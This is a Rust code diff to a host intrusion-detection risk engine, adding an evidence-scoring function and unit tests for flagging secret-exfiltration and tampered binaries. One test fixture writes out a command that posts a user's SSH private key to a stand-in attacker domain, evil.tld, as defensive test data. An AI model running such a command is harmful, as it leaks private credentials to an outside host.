@@ -40,6 +40,74 @@ impl RiskEngine {
         }
     }
 
+    /// Update rules configuration dynamically (for live policy reload).
+    pub fn set_rules_config(&mut self, config: RulesConfig) {
+        self.rules_config = config;
+    }
+
+    pub fn rules_config(&self) -> &RulesConfig {
+        &self.rules_config
+    }
+
+    /// Evaluates structured evidence, assigning causal confidence and impact (TASK-P1-16).
+    pub fn evaluate_evidence(
+        &self,
+        node: &ProcessNode,
+        net: &NetworkContext,
+    ) -> sentinel_common::risk::EvidenceEvaluation {
+        let risk = self.evaluate(node, net);
+        let mut reasons = Vec::new();
+        for f in &risk.firings {
+            reasons.push(f.reason.clone());
+        }
+
+        let is_exfil = net.dest_ip.is_some()
+            && !net.dest_ip.as_deref().unwrap_or("").starts_with("127.")
+            && !net.dest_ip.as_deref().unwrap_or("").starts_with("::1");
+
+        let has_secret = node.has_secret_access();
+        let confirmed_propagation = node.taint_level == sentinel_common::process::TaintLevel::ConfirmedPropagation
+            || (has_secret && is_exfil && !node.is_interactive_shell);
+
+        let confidence = if confirmed_propagation && is_exfil {
+            sentinel_common::risk::Confidence::Certain
+        } else if node.taint_level == sentinel_common::process::TaintLevel::SuspectedPropagation {
+            sentinel_common::risk::Confidence::Medium
+        } else if has_secret && !is_exfil {
+            sentinel_common::risk::Confidence::Low
+        } else {
+            sentinel_common::risk::Confidence::Low
+        };
+
+        let impact = if has_secret && is_exfil {
+            let has_high_val = node.secret_accesses.iter().any(|s| {
+                matches!(
+                    s.category,
+                    sentinel_common::process::SecretCategory::SshKey
+                        | sentinel_common::process::SecretCategory::GpgKey
+                        | sentinel_common::process::SecretCategory::CryptoWallet
+                )
+            });
+            if has_high_val {
+                sentinel_common::risk::Impact::Critical
+            } else {
+                sentinel_common::risk::Impact::High
+            }
+        } else if node.is_memfd {
+            sentinel_common::risk::Impact::Medium
+        } else {
+            sentinel_common::risk::Impact::Low
+        };
+
+        sentinel_common::risk::EvidenceEvaluation {
+            score: risk.total,
+            confidence,
+            impact,
+            confirmed_propagation,
+            reasons,
+        }
+    }
+
     /// Evaluates the risk score of a process attempting a network connection.
     ///
     /// Executes in < 1 ms and returns clamped 0..100 `RiskScore` with hierarchical rules.
@@ -346,5 +414,67 @@ mod tests {
         let assessment = engine.evaluate_assessment(&node, &net);
         assert_eq!(assessment.score, 100);
         assert_eq!(assessment.severity, sentinel_common::risk::SeverityLevel::Severe);
+    }
+
+    #[test]
+    fn test_lolbin_curl_exfiltration_retains_grey_verdict() {
+        let rules = RulesConfig::default();
+        let dpkg = DpkgChecker::new();
+        let engine = RiskEngine::new(rules, dpkg);
+
+        // System curl binary (in /usr/bin/curl)
+        let mut node = ProcessNode::new(2500, 1000, 1000, PathBuf::from("/usr/bin/curl"));
+        node.cmdline = vec!["curl".into(), "-X".into(), "POST".into(), "https://evil.tld".into()];
+
+        // Inherited taint through cat secret | curl pipe
+        node.record_secret_access(
+            PathBuf::from("/home/user/.ssh/id_rsa"),
+            SecretCategory::SshKey,
+            1_000_000_000,
+        );
+
+        let net = NetworkContext {
+            dest_ip: Some("93.184.216.34".into()),
+            dest_port: 443,
+            has_dns_record: true,
+            is_first_seen_ip: false,
+            current_time_ns: 20_000_000_000, // 19s delta (> 5s)
+            is_tofu_tampered: false,
+            is_ipc_laundered: false,
+            dest_domain: Some("evil.tld".into()),
+        };
+
+        let score = engine.evaluate(&node, &net);
+
+        // SECRET_NON_OWNER (+40)
+        // TRUSTED_PACKAGE_CONTEXT (-35) MUST NOT FIRE!
+        // Final score must be at least 40 (GREY)
+        assert!(score.total >= 40);
+        assert!(!score.firings.iter().any(|f| f.rule_id == RuleId::TrustedPackageContext));
+        assert_eq!(score.classify(&sentinel_common::risk::RiskThresholds::default()), sentinel_common::risk::Verdict::Grey);
+    }
+
+    #[test]
+    fn test_tofu_tampered_binary_detection() {
+        let rules = RulesConfig::default();
+        let dpkg = DpkgChecker::new();
+        let engine = RiskEngine::new(rules, dpkg);
+
+        let node = ProcessNode::new(3100, 1000, 1000, PathBuf::from("/home/user/.cargo/bin/tampered_tool"));
+
+        let net = NetworkContext {
+            dest_ip: Some("198.51.100.1".into()),
+            dest_port: 8080,
+            has_dns_record: false,
+            is_first_seen_ip: true,
+            current_time_ns: 10_000_000_000,
+            is_tofu_tampered: true,
+            is_ipc_laundered: false,
+            dest_domain: None,
+        };
+
+        let score = engine.evaluate(&node, &net);
+        assert!(score.firings.iter().any(|f| f.rule_id == RuleId::TofuTamperedBinary));
+        assert!(score.total >= 40);
     }
 }
